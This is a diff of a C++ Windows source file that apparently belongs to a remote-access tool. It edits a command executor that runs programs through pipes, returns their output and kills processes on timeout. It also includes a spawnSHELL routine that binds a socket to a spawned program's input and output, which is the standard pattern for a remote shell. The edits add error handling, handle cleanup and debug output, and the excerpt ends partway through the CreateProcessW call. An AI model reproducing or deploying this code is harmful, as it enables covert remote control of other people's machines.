@@ -1,13 +1,12 @@
 #define _WIN32_WINNT  0x0600 //https://stackoverflow.com/questions/15111799/what-is-win32-winnt-and-how-does-it-work
 
 #include "../inc/Exec.h"
-
+#include "../inc/common.h"
 #include <tlhelp32.h> 
 #include <iostream> 
 #include <windows.h>
 #include <string>
 #include <winsock2.h> 
-
 
 using namespace std;
 
@@ -18,7 +17,7 @@ Exec::Exec()
 
 vector<DWORD> Exec::returnPid(string stringTargetProcessName)
 {
-    cout << "____________>" <<  stringTargetProcessName << endl;
+    cout << "name Proc>" <<  stringTargetProcessName << endl;
     wstring targetProcessName(stringTargetProcessName.begin(), stringTargetProcessName.end());
     
     vector<DWORD> pids; //stock all pid in vector.
@@ -124,8 +123,7 @@ PROCESS_INFORMATION Exec::createChildProcess(string &command)
     
     cout << "process childen id:  " <<  GetProcessId(piProcInfo.hProcess) << endl; 
    
-    
-    BOOL statusObject = WaitForSingleObject(piProcInfo.hProcess, 2000);
+    BOOL statusObject = WaitForSingleObject(piProcInfo.hProcess, TIMEOUT_CREATE_PROC);
 
     if(statusObject == WAIT_TIMEOUT)
     {
@@ -136,11 +134,15 @@ PROCESS_INFORMATION Exec::createChildProcess(string &command)
     CloseHandle(a_hChildStd_ERR_Wr);
     CloseHandle(a_hChildStd_OUT_Wr);
     
+    CloseHandle(piProcInfo.hProcess);
+    CloseHandle(piProcInfo.hThread);
+    cout << "CLOSEEEED" << endl;
     // If an error occurs, exit the application. 
     if (!bSuccess)
     {
         cout << "Failed create process " << endl;
-        exit(1);
+        a_error = TRUE;
+        //exit(1);
     }
     return piProcInfo;
 }
@@ -157,8 +159,6 @@ string Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
     cout << "Current process2: " <<  GetCurrentProcessId() << endl;
 
     string out,err;
-
-   // cout << "SIZE HANDLE: " << status << endl;
 
     while(true)
     {
@@ -214,7 +214,7 @@ string Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
     }
 }
 
-string Exec::executeCommand(string &command)
+string Exec::executeCommand(string command)
 {
     string result_of_command;
 
@@ -224,47 +224,51 @@ string Exec::executeCommand(string &command)
     if(a_error)
     {
         cout << "[+] One or more errors were detected. " << endl; //Go popen ?
-    }
-
-    cout <<"OUT size: " <<GetFileSize(a_hChildStd_OUT_Rd,NULL) << endl;
-    cout << "ERR size: " << GetFileSize(a_hChildStd_ERR_Rd,NULL) << endl;
-    if((GetFileSize(a_hChildStd_OUT_Rd,NULL) == 0) && (GetFileSize(a_hChildStd_ERR_Rd,NULL) == 0)) //error no read in pipes. | if timeout or pipe_err and pipe_our is empty.
-    {
-        result_of_command = "The command was executed successfully but no data was returned.";
-        //If the size of stdout and stderr are = 0 it doesn't mean that there must be an error.
-    }
-//TIMEOUT!!!!
-//OUT size: 4107
-//ERR size: 0
-    else if(a_timeout) //If the command has passed the timeout then don't read the pipes and try to kill the process that is causing the problem. 
-    {
-         //test if the process is stuck:
-        vector<DWORD> pids = returnPid((command.substr(0, command.find(" ")) )+".exe"); //list all pid
-        
-        if(!pids.empty()) //if the number of pid found is different from 0 then it means that there are several times the same process
-        {
-            for(int i=0;i <pids.size(); i++)
-            {
-                HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pids[i]);
-                TerminateProcess(proc, 1);
-                CloseHandle(proc);
-                
-                cout << "[+] Process: " << pids[i] << " killed" << endl;
-            }
-            result_of_command = "TIMEOUT IN CREATEPROCESS, but all the processes in the name of:" + (command+".exe") + "we were well and truly killed.  ";
-        }
-        else
-        {
-            //esult_of_command = "[-] TIMEOUT IN CREATEPROCESS, but no process was killed.";
-            result_of_command = readFromPipe(piProcInfo);
-        }
+        return (string) "[-] FATAL ERROR.";
     }
     else
-    {result_of_command = readFromPipe(piProcInfo);}
+    {
+        cout <<"OUT size: " <<GetFileSize(a_hChildStd_OUT_Rd,NULL) << endl;
+        cout << "ERR size: " << GetFileSize(a_hChildStd_ERR_Rd,NULL) << endl;
+        if((GetFileSize(a_hChildStd_OUT_Rd,NULL) == 0) && (GetFileSize(a_hChildStd_ERR_Rd,NULL) == 0)) //error no read in pipes. | if timeout or pipe_err and pipe_our is empty.
+        {
+            result_of_command = "The command was executed successfully but no data was returned.";
+            //If the size of stdout and stderr are = 0 it doesn't mean that there must be an error.
+        }
+        else if(a_timeout) //If the command has passed the timeout then don't read the pipes and try to kill the process that is causing the problem. 
+        {
+            //test if the process is stuck:
+            cout << "in a_timeout: " << endl;
+            vector<DWORD> pids = returnPid((command.substr(0, command.find(" ")))+".exe"); //list all pid
+            
+            if(!pids.empty()) //if the number of pid found is different from 0 then it means that there are several times the same process
+            {
+                for(int i=0;i <pids.size(); i++)
+                {
+                    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pids[i]);
+                    TerminateProcess(proc, 1);
+                    CloseHandle(proc);
+                    
+                    cout << "[+] Process: " << pids[i] << " killed" << endl;
+                }
+                result_of_command = "[-] TIMEOUT IN CREATEPROCESS, but all the processes in the name of: " + (command+".exe") + "we were well and truly killed.";
+            }
+            else
+            {
+                cout << "pids empty" << endl;
+                //esult_of_command = "[-] TIMEOUT IN CREATEPROCESS, but no process was killed.";
+                result_of_command = readFromPipe(piProcInfo);
+            }
+        }
+        else
+        {result_of_command = readFromPipe(piProcInfo);}
 
-    //Finally return result_of_command
-    return result_of_command; 
+        //Finally return result_of_command
+        cout << "RESULT:  " << result_of_command << endl;
+        return result_of_command; 
+    }
 }
+
 void Exec::spawnSHELL(int sock, wchar_t *prog)
 {
     cout << "IN METHOD" << endl;
@@ -279,17 +283,11 @@ void Exec::spawnSHELL(int sock, wchar_t *prog)
 
     siStartInfo.dwFlags = STARTF_USESTDHANDLES; //| STARTF_USESHOWWINDOW) ; //for hStdInput, hStdOutput, hStdError
 
-    cout << "GO SOCK" << endl;
     siStartInfo.hStdInput = (HANDLE)sock;
     siStartInfo.hStdOutput = (HANDLE)sock;
     siStartInfo.hStdError = (HANDLE)sock;
    // siStartInfo.wShowWindow = SW_HIDE;
 
-    //GetStartupInfoA(&siStartInfo);
-    
-    //wchar_t *cmd;
-    //wcscpy(cmd, prog);
-   
     cout <<"GO" << endl;
     CreateProcessW(NULL,  //command line 
         prog,     // argv of cmd
